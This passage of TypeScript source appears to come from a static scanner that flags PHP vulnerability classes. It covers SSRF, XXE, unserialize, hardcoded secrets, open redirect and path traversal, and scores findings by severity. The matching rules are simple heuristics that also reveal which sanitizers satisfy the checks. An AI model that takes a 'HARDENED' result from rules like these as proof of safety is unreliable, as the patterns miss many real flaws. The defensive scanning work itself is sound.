      pushFinding(raw, "LFI", i + 1, rawLine, "CRITICAL");
    }

    // ---- 6) Insecure upload
    if (line.includes("move_uploaded_file(")) {
      const directName = /\$_FILES\[[^\]]*\]\s*\[\s*['"]name['"]\s*\]/.test(line) || /\$_FILES\[[^\]]*\]\s*\[\s*['"]name['"]\s*\]/.test(lines.slice(Math.max(0, i - 3), i + 2).join("\n"));
      if (!hasUploadValidation) {
        pushFinding(raw, "UPLOAD", i + 1, rawLine, directName ? "CRITICAL" : "HIGH");
      }
    }

    // ---- 7) unserialize
    if (line.includes("unserialize(") && usesUserInput(line, tainted) && !/allowed_classes/.test(line)) {
      pushFinding(raw, "UNSERIALIZE", i + 1, rawLine, "CRITICAL");
    } else if (line.includes("unserialize(") && !/allowed_classes/.test(line)) {
      pushFinding(raw, "UNSERIALIZE", i + 1, rawLine, "MEDIUM");
    }

    // ---- 8) SSRF
    if (lineHasAny(line, HTTP_FNS) && usesUserInput(line, tainted) && !hasSanitizer(line, ["filter_var(", "parse_url(", "gethostbyname(", "FILTER_VALIDATE_URL"])) {
      pushFinding(raw, "SSRF", i + 1, rawLine, "HIGH");
    }
    if (/curl_setopt\s*\(.{0,40}CURLOPT_URL\s*,/.test(line) && usesUserInput(line, tainted)) {
      pushFinding(raw, "SSRF", i + 1, rawLine, "HIGH");
    }

    // ---- 9) XXE
    if (/simplexml_load_string\s*\(|->loadXML\s*\(|XMLReader|->xml\(/.test(line) && !hasXxeGuard) {
      pushFinding(raw, "XXE", i + 1, rawLine, "HIGH");
    }

    // ---- 10) CSRF (state-changing POST without token)
    if (/(\$_POST\s*\[|\$_REQUEST\s*\[)/.test(line) && postsStateChange && !hasCsrfCheck && !raw.some((f) => f.code === "CSRF")) {
      pushFinding(raw, "CSRF", i + 1, rawLine, "MEDIUM");
    }

    // ---- 11) SECRETS (hardcoded credentials)
    if (
      ((/(password|passwd|secret|api_?key|auth_?key|access_?token|private_?key|db_?pass)\w*\s*=\s*['"][^'"]{4,}['"]/i.test(line)) ||
       (/['"](?:api_?key|secret|password|db_?pass|client_?secret|auth_?key)['"]\s*,\s*['"][^'"]{4,}['"]/i.test(line))) &&
      !/\$_(GET|POST|REQUEST|COOKIE|SERVER|ENV)/i.test(line)
    ) {
      pushFinding(raw, "SECRETS", i + 1, rawLine, "CRITICAL");
    }

    // ---- 12) RAND (insecure randomness)
    if (lineHasAny(line, ["rand(", "mt_rand(", "srand(", "uniqid("]) && !hasSanitizer(line, ["random_bytes(", "random_int("])) {
      const secCtx = /token|salt|nonce|otp|code|key|session|csrf|auth|reset|hash|id/i.test(line);
      pushFinding(raw, "RAND", i + 1, rawLine, secCtx ? "HIGH" : "MEDIUM");
    }

    // ---- 13) PHPINFO exposure
    if (/phpinfo\s*\(/.test(line)) {
      pushFinding(raw, "PHPINFO", i + 1, rawLine, "HIGH");
    }

    // ---- 14) DEBUG mode / verbose output
    if (/display_errors\s*=\s*['"]?(1|on|true)/i.test(line) || /['"]display_errors['"]\s*,\s*['"]?(1|on|true)/i.test(line)) {
      pushFinding(raw, "DEBUG", i + 1, rawLine, "MEDIUM");
    } else if (lineHasAny(line, ["var_dump(", "print_r("]) && usesUserInput(line, tainted)) {
      pushFinding(raw, "DEBUG", i + 1, rawLine, "LOW");
    }

    // ---- 15) COOKIE without security flags
    if (/setcookie\s*\(|session_set_cookie_params\s*\(/.test(line) && !/httponly/i.test(line)) {
      pushFinding(raw, "COOKIE", i + 1, rawLine, "MEDIUM");
    }

    // ---- 16) WEAKHASH (md5/sha1 for security purposes)
    if (lineHasAny(line, ["md5(", "sha1("])) {
      const secCtx = /pass|pwd|token|auth|login|session|csrf|sign|secret|hash/i.test(line);
      pushFinding(raw, "WEAKHASH", i + 1, rawLine, secCtx ? "HIGH" : "LOW");
    }

    // ---- 17) REDIR (open redirect)
    if (/header\s*\(\s*['"]Location:/i.test(line) && usesUserInput(line, tainted) && !hasSanitizer(line, ["in_array(", "preg_match(", "strpos(", "str_starts_with(", "parse_url("])) {
      pushFinding(raw, "REDIR", i + 1, rawLine, "MEDIUM");
    }

    // ---- 18) TRAVERSAL (destructive file ops with user path)
    if (lineHasAny(line, ["unlink(", "rmdir(", "rename(", "copy("]) && usesUserInput(line, tainted) && !hasSanitizer(line, ["basename(", "realpath("])) {
      pushFinding(raw, "TRAVERSAL", i + 1, rawLine, "HIGH");
    }
  }

  // line-order sort, phir same-class duplicates merge
  raw.sort((a, b) => a.line - b.line);
  const findings = mergeDuplicates(raw);

  // risk score RAW instances pe (har buggy line count hota hai)
  const countSev = (arr: PhpFinding[], s: string) => arr.filter((f) => f.severity === s).length;
  const riskScore = Math.min(100, countSev(raw, "CRITICAL") * 25 + countSev(raw, "HIGH") * 12 + countSev(raw, "MEDIUM") * 5 + countSev(raw, "LOW") * 2);
  const verdict: PhpScanSummary["verdict"] =
    countSev(raw, "CRITICAL") > 0 || countSev(raw, "HIGH") > 0 ? "ATTACKABLE" : findings.length > 0 ? "NEEDS-REVIEW" : "HARDENED";

  return {
    findings,
    summary: {
      totalLines: lines.length,
      totalFindings: findings.length,
      totalInstances: raw.length,
      critical: countSev(findings, "CRITICAL"),
      high: countSev(findings, "HIGH"),
      medium: countSev(findings, "MEDIUM"),
      low: countSev(findings, "LOW"),
      riskScore,
      verdict,
    },
  };
}

export const PHP_BUG_CLASSES = Object.entries(ATTACK_DEFS).map(([code, def]) => ({
  code,
  name: def.cls,
  cwe: def.cwe,
}));
